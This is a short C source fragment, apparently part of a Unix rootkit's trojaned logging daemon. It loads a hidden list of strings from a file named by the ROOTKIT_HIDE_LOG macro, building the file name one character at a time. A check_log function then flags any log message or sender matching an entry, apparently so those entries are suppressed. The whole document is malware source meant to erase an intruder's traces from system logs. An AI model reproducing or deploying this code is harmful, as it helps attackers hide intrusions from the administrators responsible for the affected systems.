#define STR_SIZE 128

struct  h_st {
	struct h_st     *next;
	char            logstr[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];

FILE    *fp_hack;
int     showall=0;

inline log_block_list()
{
	char FILENAME[10];

	FILENAME[0]=ROOTKIT_HIDE_LOG[0];
	FILENAME[1]=ROOTKIT_HIDE_LOG[1];
	FILENAME[2]=ROOTKIT_HIDE_LOG[2];
	FILENAME[3]=ROOTKIT_HIDE_LOG[3];
	FILENAME[4]=ROOTKIT_HIDE_LOG[4];
	FILENAME[5]=ROOTKIT_HIDE_LOG[5];
	FILENAME[6]=ROOTKIT_HIDE_LOG[6];
	FILENAME[7]=ROOTKIT_HIDE_LOG[7];
	FILENAME[8]=ROOTKIT_HIDE_LOG[8];
	FILENAME[9]='\0';

	h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
	hack_list=h_tmp;

	if(fp_hack=fopen(FILENAME, "r")) {
                while(fgets(tmp_str, 126, fp_hack)) {
                        h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
                        strcpy(h_tmp->logstr, tmp_str);
                        h_tmp->logstr[strlen(h_tmp->logstr)-1]='\0';
                        h_tmp=h_tmp->next;
                }
        fclose(fp_hack);
        }

	h_tmp->next=NULL;
}     

inline int check_log(char *msg, char *from)
{
	for(h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next)
		if((strstr(msg, h_tmp->logstr))||(strstr(from, h_tmp->logstr)))
			return(1);

	return(0);
}
